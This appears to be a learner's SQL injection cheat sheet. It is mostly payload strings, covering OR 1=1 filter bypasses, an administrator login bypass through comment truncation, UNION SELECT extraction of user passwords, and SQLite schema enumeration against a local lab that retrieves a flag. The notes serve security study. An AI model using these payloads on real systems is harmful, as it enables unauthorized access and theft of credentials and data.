## Retrieving hidden data

```css
https://insecure-website.com/products?category=Gifts

SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

```css
https://insecure-website.com/products?category=Gifts'--

SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

```css
https://insecure-website.com/products?category=Gifts'+OR+1=1--

https://insecure-website.com/products?category=Gifts' OR 1=1--

SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

## Subverting application logic

```css
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

## Retrieving data from other database tables

```css
SELECT name, description FROM products WHERE category = 'Gifts'

' UNION SELECT username, password FROM users--
```

## UNION-based injections

```css
' UNION SELECT 1, 'anotheruser', 'any string', 1--

note =>	column1 (1) column2 ('anotheruser') column3 ('any string') column4 (1--)

we have three column => city, address, phone_number 
' UNION SELECT 1, 'test', 'anything'--
' UNION SELECT 1, 2, 3--
' UNION SELECT sqlite_version(), 2, 3--
```

```css
http://127.0.0.1/sqlite-lab/index.php?snumber=1337 union SELECT 1,group_concat(tbl_name),3,4,5 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'

'union SELECT 1,group_concat(tbl_name),3,4,5 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'


'union SELECT 1,group_concat(tbl_name),3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--

' UNION SELECT 1,group_concat(tbl_name),3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--

-1' UNION SELECT 1, 2, group_concat(tbl_name) FROM sqlite_master WHERE type='table'--


users,offices,hints,more_table

'union SELECT 1,sql,3,4,5 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'--

' union SELECT 1,sql,3 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='more_table'--

' UNION SELECT 1,flag,3 FROM more_table--

```


> [!Note]  SQL Injection
> to know about SQL injection [click here](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections) 
> for form information about sqlite [click here](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)

